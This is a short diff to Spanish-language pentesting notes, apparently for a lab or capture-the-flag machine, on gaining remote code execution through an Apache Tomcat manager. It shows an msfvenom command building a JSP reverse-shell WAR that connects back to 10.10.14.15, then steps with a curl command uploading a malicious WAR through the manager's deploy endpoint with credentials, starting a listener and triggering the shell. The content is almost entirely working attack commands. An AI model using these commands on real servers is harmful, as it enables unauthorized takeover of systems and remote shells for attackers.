@@ -40,3 +40,14 @@ Podemos luego de entrar al manager conseguir rce subiendo una webshell .WAR
     msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
     
 
+### Manager-script exploitation
+
+1) creamos el file .war
+2) subimos el archivo
+
+        curl -v -u user:pass --upload-file pwn.war "http://x.x.x.x:8080/manager/text/deploy?path=/foo&update=true"
+
+3) Iniciamos un listener
+4) llamamos al script
+
+        http://<ip_url>:8080/foo
